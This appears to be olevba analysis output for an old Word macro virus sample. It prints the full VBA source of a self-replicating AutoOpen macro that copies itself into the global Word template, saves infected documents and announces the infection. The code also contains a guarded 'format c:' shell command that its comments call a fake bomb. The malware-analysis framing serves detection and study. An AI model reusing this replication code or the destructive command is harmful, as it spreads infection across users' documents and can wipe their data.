olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Alliance.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Alliance.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Alliance.c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Fname$
Dim MacName$
Dim a$
Dim a_
    'virus macro, basé sur le mécanisme du virus Alliance
    'destiné à effectuer des tests de fonctionnements...
    '1997- mister Mad

On Error GoTo -1: On Error GoTo ErrorHandler1               'si erreurs
Fname$ = WordBasic.[FileName$]()                    'nom de ce fichier
MacName$ = Fname$ + ":AutoOpen"         'nom du virus
WordBasic.FileSummaryInfo Subject:="Ce document est infecté {mister Mad#004+}"
WordBasic.MacroCopy MacName$, "Global:AutoNew"  'qu'on copie dans AutoNew
WordBasic.MacroCopy MacName$, "Global:AutoOpen" 'et dans AutoOpen globaux
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
ErrorHandler1:
On Error GoTo -1: On Error GoTo ErrorHandler2               'si nouvelle erreur
        If WordBasic.IsDocumentDirty() = -1 Then    'si doc est modifié
            WordBasic.MacroCopy "Global:AutoOpen", MacName$ 'on copie le virus
        End If                          'sur la macro modifiée
        WordBasic.FileSaveAs Format:=1      'et enregistre
                                        'fausse bombe
If WordBasic.CommandValid(a$) = -1 Then     'ne peut pas être executé !
    If a_ = 29873876 Then
        WordBasic.Shell "format c: > NUL"
    End If
End If
ErrorHandler2:                          'et quitte...
WordBasic.PrintStatusBar "Votre word est maintenant infecté, par le virus 004"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

